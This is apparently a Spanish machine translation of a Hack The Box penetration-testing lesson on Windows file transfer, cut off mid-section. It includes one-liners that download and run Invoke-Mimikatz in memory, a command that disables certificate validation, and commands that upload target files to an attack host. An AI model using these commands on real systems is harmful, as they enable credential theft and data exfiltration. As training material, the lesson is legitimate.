# Métodos de transferencia de archivos de Windows

# **Introducción**

El sistema operativo Windows ha evolucionado en los últimos años, y las nuevas versiones vienen con diferentes utilidades para operaciones de transferencia de archivos. Comprender la transferencia de archivos en Windows puede ayudar tanto a los atacantes como a los defensores. Los atacantes pueden usar varios métodos de transferencia de archivos para operar y evitar ser atrapados. Los defensores pueden aprender cómo funcionan estos métodos para monitorear y crear las políticas correspondientes para evitar ser comprometidos. Usemos el[Ataque de Microsoft Astaroth](https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/)Publicación de blog como ejemplo de una amenaza persistente avanzada (APT).

La publicación del blog comienza hablando de[amenazas sin archivo](https://www.microsoft.com/en-us/security/blog/2018/01/24/now-you-see-me-exposing-fileless-malware/). El término`fileless`sugiere que una amenaza no viene en un archivo, utilizan herramientas legítimas integradas en un sistema para ejecutar un ataque. Esto no significa que no haya una operación de transferencia de archivos. Como se discutió más adelante en esta sección, el archivo no está "presente" en el sistema, sino que se ejecuta en la memoria.

El`Astaroth attack`Generalmente siguieron estos pasos: un enlace malicioso en un correo electrónico de phishing de lanza condujo a un archivo LNK. Cuando se hace doble clic, el archivo LNK causó la ejecución del[Herramienta WMIC](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic)con el parámetro "/formato", que permitió la descarga y ejecución del código JavaScript malicioso. El código de JavaScript, a su vez, descarga las cargas útiles abusando de la[Herramienta bitsadmin](https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool).

Todas las cargas útiles fueron codificadas y decodificadas de Base64 utilizando la herramienta CertuTil, lo que resultó en algunos archivos DLL. El[regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32)La herramienta se usó luego para cargar uno de los DLL decodificados, que descifraron y cargaron otros archivos hasta que la carga útil final, Astaroth, se inyectó en el`Userinit`proceso. A continuación se muestra una representación gráfica del ataque.

![](https://academy.hackthebox.com/storage/modules/24/fig1a-astaroth-attack-chain.png)

[Fuente de la imagen](https://www.microsoft.com/security/blog/wp-content/uploads/2019/08/fig1a-astaroth-attack-chain.png)

Este es un excelente ejemplo de múltiples métodos para la transferencia de archivos y el actor de amenaza que usa esos métodos para evitar las defensas.

Esta sección discutirá el uso de algunas herramientas de Windows nativas para descargar y cargar operaciones. Más adelante en el módulo, discutiremos`Living Off The Land`Binarios en Windows y Linux y cómo usarlos para realizar operaciones de transferencia de archivos.

---

# **Descargar operaciones**

Tenemos acceso a la máquina`MS02`, y necesitamos descargar un archivo de nuestro`Pwnbox`máquina. Veamos cómo podemos lograr esto utilizando múltiples métodos de descarga de archivos.

![](https://academy.hackthebox.com/storage/modules/24/WIN-download-PwnBox.png)

# **PowerShell Base64 Codificar y decodificar**

Dependiendo del tamaño del archivo que deseamos transferir, podemos usar diferentes métodos que no requieren comunicación de red. Si tenemos acceso a un terminal, podemos codificar un archivo a una cadena Base64, copiar su contenido del terminal y realizar la operación inversa, decodificando el archivo en el contenido original. Veamos cómo podemos hacer esto con PowerShell.

Un paso esencial para usar este método es asegurarse de que el archivo que codifique y decodifique sea correcto. Podemos usar[md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), un programa que calcula y verifica las suma de verificación MD5 de 128 bits. El hash MD5 funciona como una huella digital compacta de un archivo, lo que significa que un archivo debe tener el mismo hash MD5 en todas partes. Intentemos transferir una tecla SSH de muestra. Puede ser cualquier otra cosa, desde nuestro Pwnbox hasta el objetivo de Windows.

### **Pwnbox comprobar ssh key md5 hash**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ md5sum id_rsa4e301756a07ded0a2dd6953abf015278  id_rsa

```

### **Pwnbox codifica la tecla SSH a Base64**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ cat id_rsa |base64 -w 0;echoLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=

```

Podemos copiar este contenido y pegarlo en una terminal de Windows PowerShell y usar algunas funciones de PowerShell para decodificarlo.

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))

```

Finalmente, podemos confirmar si el archivo se transfirió correctamente utilizando el[Get-Filehash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2)cmdlet, que hace lo mismo que`md5sum`hace.

### **Confirmando la coincidencia de hashes MD5**

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa

```

**Nota:**Si bien este método es conveniente, no siempre es posible usarlo. La utilidad de la línea de comando de Windows (cmd.exe) tiene una longitud de cadena máxima de 8,191 caracteres. Además, un shell web puede error si intenta enviar cuerdas extremadamente grandes.

---

# **Descargas web de PowerShell**

La mayoría de las empresas permiten`HTTP`y`HTTPS`El tráfico saliente a través del firewall para permitir la productividad de los empleados. Aprovechar estos métodos de transporte para operaciones de transferencia de archivos es muy conveniente. Aún así, los defensores pueden usar soluciones de filtrado web para evitar el acceso a categorías específicas del sitio web, bloquear la descarga de tipos de archivos (como .exe) o solo permitir el acceso a una lista de dominios con la lista blanca en redes más restringidas.

PowerShell ofrece muchas opciones de transferencia de archivos. En cualquier versión de PowerShell, el[System.net.webclient](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0)La clase se puede usar para descargar un archivo`HTTP`, `HTTPS`o`FTP`. La siguiente[mesa](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0)Describe los métodos de client web para descargar datos de un recurso:

| **Método** | **Descripción** |
| --- | --- |
| [Abierto](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0) | Devuelve los datos de un recurso como un[Arroyo](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadasync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0) | Devuelve los datos de un recurso sin bloquear el hilo de llamadas. |
| [Descargar Data](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0) | Descarga datos de un recurso y devuelve una matriz de bytes. |
| [Descargar DataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0) | Descarga datos de un recurso y devuelve una matriz de bytes sin bloquear el hilo de llamadas. |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0) | Descarga datos de un recurso a un archivo local. |
| [Downloadfileasync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0) | Descarga datos de un recurso a un archivo local sin bloquear el hilo de llamadas. |
| [Descargar string](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0) | Descarga una cadena de un recurso y devuelve una cadena. |
| [Descargar stringasync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Descarga una cadena de un recurso sin bloquear el hilo de llamadas. |

Exploremos algunos ejemplos de esos métodos para descargar archivos usando PowerShell.

### **Método PowerShell DownloadFile**

Podemos especificar el nombre de clase`Net.WebClient`y el método`DownloadFile`con los parámetros correspondientes a la URL del archivo de destino para descargar y el nombre del archivo de salida.

### **Descarga de archivos**

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')

```

### **PowerShell DownloadString - Método Filless**

Como discutimos anteriormente, los ataques sin archivo funcionan utilizando algunas funciones del sistema operativo para descargar la carga útil y ejecutarla directamente. PowerShell también se puede usar para realizar ataques sin archivo. En lugar de descargar un script de PowerShell en el disco, podemos ejecutarlo directamente en la memoria utilizando el[Invoca-Expresión](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2)cmdlet o el alias`IEX`.

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

```

`IEX`También acepta la entrada de la tubería.

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

```

### **PowerShell Invoke-WebRequest**

De PowerShell 3.0 en adelante, el[Invocar webrequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2)Cmdlet también está disponible, pero es notablemente más lento para descargar archivos. Puedes usar los alias`iwr`, `curl`, y`wget`en lugar de el`Invoke-WebRequest`Nombre completo.

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

```

Harmj0y ha compilado una extensa lista de PowerShell Descargar cunas[aquí](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). Vale la pena familiarizarse con ellos y sus matices, como la falta de conciencia de poder o el disco tocando (descargando un archivo en el objetivo) para seleccionar el apropiado para la situación.

### **Errores comunes con PowerShell**

Puede haber casos en los que no se haya completado la configuración del primer lanzamiento de Internet Explorer, lo que evita la descarga.

![](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)

Esto se puede omitir utilizando el parámetro`-UseBasicParsing`.

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

```

Otro error en las descargas de PowerShell está relacionado con el canal seguro SSL/TLS si no se confía en el certificado. Podemos omitir ese error con el siguiente comando:

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

# **Descargas SMB**

El protocolo de bloque de mensajes del servidor (protocolo SMB) que se ejecuta en el puerto TCP/445 es común en las redes empresariales donde los servicios de Windows se están ejecutando. Permite que las aplicaciones y los usuarios transfieran archivos hacia y desde servidores remotos.

Podemos usar SMB para descargar archivos de nuestro Pwnbox fácilmente. Necesitamos crear un servidor SMB en nuestro Pwnbox con[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)de impunde y luego usa`copy`, `move`, PowerShell`Copy-Item`, o cualquier otra herramienta que permita la conexión a SMB.

### **Crea el servidor SMB**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshareImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Para descargar un archivo del servidor SMB al directorio de trabajo actual, podemos usar el siguiente comando:

### **Copie un archivo desde el servidor SMB**

Métodos de transferencia de archivos de Windows

```
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.

```

Nuevas versiones de Windows bloquean el acceso no autenticado de los invitados, como podemos ver en el siguiente comando:

Métodos de transferencia de archivos de Windows

```
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.

```

Para transferir archivos en este escenario, podemos establecer un nombre de usuario y contraseña utilizando nuestro servidor SMB de Impacket y montar el servidor SMB en nuestra máquina de destino de Windows:

### **Cree el servidor SMB con un nombre de usuario y contraseña**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password testImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

### **Monte el servidor SMB con nombre de usuario y contraseña**

Métodos de transferencia de archivos de Windows

```
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.

```

**Nota:**También puede montar el servidor SMB si recibe un error cuando usa `Copiar el nombre de archivo \\ ip \ sharename`.

---

# **Descargas FTP**

Otra forma de transferir archivos es usar FTP (protocolo de transferencia de archivos), que usan el puerto TCP/21 y TCP/20. Podemos usar el cliente FTP o PowerShell Net.WebClient para descargar archivos de un servidor FTP.

Podemos configurar un servidor FTP en nuestro host de ataque usando Python3`pyftpdlib`módulo. Se puede instalar con el siguiente comando:

### **Instalación del módulo FTP Server Python3 - Pyftpdlib**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ sudo pip3 install pyftpdlib
```

Entonces podemos especificar el puerto número 21 porque, por defecto,`pyftpdlib`Utiliza el puerto 2121. La autenticación anónima está habilitada de forma predeterminada si no establecemos un usuario y una contraseña.

### **Configuración de un servidor PYTHON3 FTP**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ sudo python3 -m pyftpdlib --port 21[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<

```

Después de configurar el servidor FTP, podemos realizar transferencias de archivos utilizando el cliente FTP preinstalado desde Windows o PowerShell`Net.WebClient`.

### **Transferir archivos desde un servidor FTP usando PowerShell**

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

```

Cuando obtenemos una carcasa en una máquina remota, es posible que no tengamos una carcasa interactiva. Si ese es el caso, podemos crear un archivo de comando FTP para descargar un archivo. Primero, necesitamos crear un archivo que contenga los comandos que queremos ejecutar y luego usar el cliente FTP para usar ese archivo para descargar ese archivo.

### **Cree un archivo de comando para el cliente FTP y descargue el archivo de destino**

Métodos de transferencia de archivos de Windows

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file

```

---

# **Operaciones de carga**

También hay situaciones como agrietamiento de contraseñas, análisis, exfiltración, etc., donde debemos cargar archivos de nuestra máquina de destino en nuestro host de ataque. Podemos usar los mismos métodos que utilizamos para la operación de descarga, pero ahora para cargas. Veamos cómo podemos lograr la carga de archivos de varias maneras.

---

# **PowerShell Base64 Codificar y decodificar**

Vimos cómo decodificar una cadena Base64 usando PowerShell. Ahora, hagamos la operación inversa y codifiquemos un archivo para que podamos decodificarlo en nuestro host de ataque.

### **Codificar archivo usando PowerShell**

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D

```

Copiamos este contenido y lo pegamos en nuestro host de ataque, usamos el`base64`cometer para decodificarlo y usar el`md5sum`La aplicación para confirmar la transferencia ocurrió correctamente.

### **Decode Base64 String en Linux**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ md5sum hosts 3688374325b992def12793500307566d  hosts

```

---

# **PowerShell Subidas web**

PowerShell no tiene una función incorporada para operaciones de carga, pero podemos usar`Invoke-WebRequest`o`Invoke-RestMethod`Para construir nuestra función de carga. También necesitaremos un servidor web que acepte cargas, que no es una opción predeterminada en las utilidades de servidor web más común.

Para nuestro servidor web, podemos usar[SuboadServer](https://github.com/Densaugeo/uploadserver), un módulo extendido de la pitón[Http.server módulo](https://docs.python.org/3/library/http.server.html), que incluye una página de carga de archivos. Vamos a instalarlo e iniciar el servidor web.

### **Instalación de un servidor web configurado con carga**

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ pip3 install uploadserverCollecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1

```

Métodos de transferencia de archivos de Windows

```
xnoxos@htb[/htb]$ python3 -m uploadserverFile upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

Ahora podemos usar un script de PowerShell[Psupload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)que usa`Invoke-RestMethod`Para realizar las operaciones de carga. El script acepta dos parámetros`-File`, que usamos para especificar la ruta del archivo, y`-Uri`, la URL del servidor donde subiremos nuestro archivo. Intentemos cargar el archivo de host desde nuestro host de Windows.

### **Script PowerShell para cargar un archivo al servidor de carga de Python**

Métodos de transferencia de archivos de Windows

```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373

```

### **PowerShell Base64 Subida web**

Otra forma de usar archivos codificados PowerShell y Base64 para operaciones de carga es mediante el uso de`Invoke-WebRequest`o`Invoke-RestMethod`junto con Netcat. Usamos NetCat para escuchar en un puerto que especificamos y enviar el archivo como un`POST`pedido. Finalmente, copiamos la salida y usamos la función de decodificación Base64 para convertir la cadena Base64 en un archivo.

Métodos de transferencia de archivos de Windows

```powershell
